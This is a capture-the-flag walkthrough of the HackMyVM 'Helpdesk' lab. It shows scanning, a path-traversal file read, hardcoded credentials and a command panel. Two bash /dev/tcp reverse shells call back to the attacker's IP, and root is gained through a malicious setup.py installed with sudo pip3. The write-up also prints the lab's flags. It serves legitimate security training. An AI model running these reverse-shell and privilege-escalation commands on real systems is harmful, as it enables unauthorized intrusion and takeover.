## Hackmyvm Helpdesk
### Initial Scan
I use the `fping` command to get ip address of the target machine. Here I'm using the `10.9.9.0/24` subnet because that's where all the vulnerable VMs are hosted.
```bash
kali :: exercises/HMV/helpdesk » fping -agq 10.9.9.0/24
10.9.9.1
10.9.9.12
```
##### Nmap Scans
A simple `nmap` scan on the target machine's IP address reveals that we have two ports open.
```bash
kali :: exercises/HMV/helpdesk » nmap -p- 10.9.9.12
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-22 11:13 EDT
Nmap scan report for 10.9.9.12
Host is up (0.0017s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
A `UDP` scan did not reveal any ports that are open which implies that the machine has all the `UDP` ports in a closed state.
Service and version enumerations using the `-sVC` flag will help us better understand the services running on the machine.
```bash
kali :: exercises/HMV/helpdesk » nmap -sVC -p22,80 10.9.9.12 -oA ./nmap/helpdesk                                         130 ↵
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-22 11:27 EDT
Nmap scan report for 10.9.9.12
Host is up (0.0014s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b4:bc:42:f6:d0:a7:0d:fd:71:01:3d:8a:c5:0c:ac:e3 (ECDSA)
|_  256 71:90:08:58:14:04:09:d5:cf:31:ee:87:17:ad:29:8f (ED25519)
80/tcp open  http    Apache httpd
|_http-title: HelpDesk Ticket System
|_http-server-header: Apache
```
An obvious way to go is through port `80`. And it's where most CTF low hanging fruits can be found. 
The website does not leak anything from the `UI` side or the source code, it's just plain html and CSS.
I tried checking for vulnerabilities using `nikto` but nothing usable came back.
```bash
kali :: exercises/HMV/helpdesk » nikto -h http://10.9.9.12                                                                 1 ↵
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.9.9.12
+ Target Hostname:    10.9.9.12
+ Target Port:        80
+ Start Time:         2025-08-22 11:47:27 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /login.php: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /login.php: Admin login page/section found.
+ /helpdesk/: Directory indexing found.
+ /helpdesk/: This might be interesting.
+ /debug.php: Possible debug directory/program found.
+ 8074 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2025-08-22 11:47:48 (GMT-4) (21 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
notice the directories that were found with `nikto`.  I also run `gobuster` and I got the same directories as the results from `nikto`. 
```bash
200      GET       56l      138w     1290c http://10.9.9.12/
200      GET       56l      138w     1290c http://10.9.9.12/index.php
200      GET       86l      167w     1819c http://10.9.9.12/login.php
301      GET        7l       20w      236c http://10.9.9.12/javascript => http://10.9.9.12/javascript/
301      GET        7l       20w      234c http://10.9.9.12/helpdesk => http://10.9.9.12/helpdesk/
200      GET        5l       28w      204c http://10.9.9.12/ticket.php
302      GET        0l        0w        0c http://10.9.9.12/panel.php => login.php
200      GET        5l       29w      250c http://10.9.9.12/debug.php
```
`debug.php` looks interesting and visiting the page we get credentials that are not usable in all of the machine. It's a rabbit hole 
```bash
kali :: exercises/HMV/helpdesk » curl http://10.9.9.12/debug.php                                                           1 ↵
<style>
body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
h2 { color: #0ff; }
</style><h2>Debug Mode Enabled</h2><pre>[DEBUG] Connecting to internal dev server...
[DEBUG] Using creds: service_user:SuperSecretDev123!</pre>%
```
Trying to fuzz for parameters in the `debug.php` file has yielded nothing. On to the next page `ticket.php`
```bash
ffuf -u http://10.9.9.12/ticket.php\?FUZZ\=../../../../etc/passwd -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -fw 24

---response---
url                     [Status: 200, Size: 2135, Words: 42, Lines: 41, Duration: 7ms]
```
Finally we got `url` as a parameter to the ticket page. Checking out the output of the command we get the following
```bash
kali :: exercises/HMV/helpdesk » curl http://10.9.9.12/ticket.php\?url\=../../../../etc/passwd
<style>
body { font-family: sans-serif; background: #f0f0f0; padding: 20px; }
pre { background: #fff; padding: 10px; border-left: 4px solid #4A90E2; }
h1 { color: #4A90E2; }
</style><h1>Ticket Viewer</h1><h1>Ticket Viewer</h1><pre>root:x:0:0:root:/root:/bin/bash
<SNIP>
games:x:5:60:games:/usr/games:/usr/sbin/nologin
mrmidnight:x:1000:1000:MrMidnight:/home/mrmidnight:/bin/bash
mysql:x:110:110:MySQL Server,,,:/nonexistent:/bin/false
helpdesk:x:1001:1001::/home/helpdesk:/bin/bash
```
From the output we have three users `root`,`mrmidnight`, and `helpdesk`. Apart from reading the passwd file we can't really read any other file that could give us a foothold. I tried reading the `authorized_keys` from every user's ssh file but nothing came up.
Another way to utilize this is by reading the source codes of the website.
```bash
kali :: exercises/HMV/helpdesk » curl http://10.9.9.12/ticket.php\?url\=login.php
<style>
body { font-family: sans-serif; background: #f0f0f0; padding: 20px; }
pre { background: #fff; padding: 10px; border-left: 4px solid #4A90E2; }
h1 { color: #4A90E2; }
</style><h1>Ticket Viewer</h1><h1>Ticket Viewer</h1><pre><?php
session_start();

// Enable PHP error display for debugging (remove in production)
ini_set('display_errors', 1);
error_reporting(E_ALL);

// Stored credentials
$stored_user = 'helpdesk';

// SHA-512 hash for password: ticketmaster
$stored_hash = '$6$ABC123$fLo2MacCV.XBQeRZtHWL2297q/fUBs/b8gOmvLGuiz7wDgl3MSWcOOSKnTbaNPoUMCmEpY1dlwuPKbAtIuoo6.';
```
From the above output there's are hardcoded credentials which can help further our attacks.
```text
helpdesk:ticketmaster
```
Tried login in using the credentials over `SSH`. but to no avail
The credentials were correct on the login page of the website and I got access to the panel.
And this is how the page is handling the functionality
```php
// Handle command input
$output = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = shell_exec($cmd . " 2>&1");
}
?>
```
I got a shell by running the following commands
```bash
---target host---
cmd=bash -c "bash -i >& /dev/tcp/10.5.5.6/9001 0>&1"

---attacker machine---
nc -lvnp 9001
```
Going through the file system of the machine. I found some interesting scripts in the  `/opt` folder.
```bash
www-data@helpdesk:/opt/helpdesk-socket$ ls -la
ls -la
total 16
drwxr-xr-x 2 helpdesk helpdesk 4096 Aug 23 11:18 .
drwxr-xr-x 4 root     root     4096 Aug 16 15:32 ..
-rwxr-xr-x 1 helpdesk helpdesk  158 Aug 16 15:32 handler.sh
srwxrwxrwx 1 helpdesk helpdesk    0 Aug 23 11:18 helpdesk.sock
-rw-r--r-- 1 root     root      184 Aug 16 15:44 serve.sh
```
Contents of the files are
```bash
---serve.sh---
cat serve.sh
#!/bin/bash

SOCKET="/opt/helpdesk-socket/helpdesk.sock"

[ -e "$SOCKET" ] && rm "$SOCKET"

/usr/bin/socat -d -d UNIX-LISTEN:$SOCKET,fork,mode=777 EXEC:/opt/helpdesk-socket/handler.sh

--handler.sh---
cat handler.sh
#!/bin/bash
# Simple parser — executes anything sent over the socket (dangerous!)
read cmd
echo "[HelpDesk Automation] Executing: $cmd"
/bin/bash -c "$cmd"
```
Since the `helpdesk.sock` file has a SUID bit and is owned by the user helpdesk, then if we establish a connection to the host using the sock file all the commands will be executed with the `helpdesk` user context.
```bash
echo 'bash -i >& /dev/tcp/10.6.6.5/9002 0>&1' | socat - UNIX-CONNECT:/opt/helpdesk-socket/helpdesk.sock
```
Used the above script to run another reverse shell as the `helpdesk` user.
we now have the user flag
```text
flag{ticket_approved_by_thedesk}
```
checking for any sudo capabilities that the `helpdesk` user might have 
```bash
helpdesk@helpdesk:~$ sudo -l
sudo -l
Matching Defaults entries for helpdesk on helpdesk:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User helpdesk may run the following commands on helpdesk:
    (ALL) NOPASSWD: /usr/bin/pip3 install --break-system-packages *
```
From the above output we can install any python package into the host without any sudo password.
Here we create a malicious python package and use it to gain root privileges with the help of chatGPT I was able to create a malicious python package
```bash
kali :: exercises/HMV/helpdesk » tree mypackage
mypackage
├── LICENSE
├── mypackage
│   ├── __init__.py
│   ├── module1.py
│   └── module2.py
├── pyproject.toml
├── README.md
├── setup.cfg
└── tests
    └── test_module1.py
```
this was the tree structure for the package named `mypackage`. then move the package after creating it to the target machine and install it with the command
```bash
sudo /usr/bin/pip3 install --break-system-packages mypackage
```
and run
```bash
bash -p
```
and you will have gained the root privileges because the `mypackage` contained codes that will add the `SUID` bit to `/bin/bash`.
Also a simple way is to create a directory and create a `setup.py` script with the following
```bash
helpdesk@helpdesk:~/test$ echo 'import os; os.system("chmod +s /bin/bash")' > setup.py
<ort os; os.system("chmod +s /bin/bash")' > setup.py
helpdesk@helpdesk:~/test$ cat setup.py
cat setup.py
import os; os.system("chmod +s /bin/bash")
helpdesk@helpdesk:~/test$ ls -la /bin/bash
ls -la /bin/bash
-rwxr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
helpdesk@helpdesk:~/test$ sudo /usr/bin/pip3 install --break-system-packages .
<udo /usr/bin/pip3 install --break-system-packages .
Processing /home/helpdesk/test
  Preparing metadata (setup.py): started
  Preparing metadata (setup.py): finished with status 'done'
ERROR: No .egg-info directory found in /tmp/pip-pip-egg-info-alaqz28v
helpdesk@helpdesk:~/test$ ls -la /bin/bash
ls -la /bin/bash
-rwsr-sr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```
Also the script used with the above script also adds the `SUID` bit to the bash program. and it will enable use to execute commands as the root user

#### Finally Root Flag
```bash
helpdesk@helpdesk:~/est$ bash -p
whoami
root
id
uid=1001(helpdesk) gid=1001(helpdesk) euid=0(root) egid=0(root) groups=0(root),1001(helpdesk)
cat root.txt
flag{request_has_been_escalated}
```
EGID stands for Effective Group ID. It is a crucial process attribute used for determining the permissions a process has when accessing resources

#### Lesson Learned
- Always look for parameters, mostly on PHP websites as they are more common than other technologies.
- how to create a python package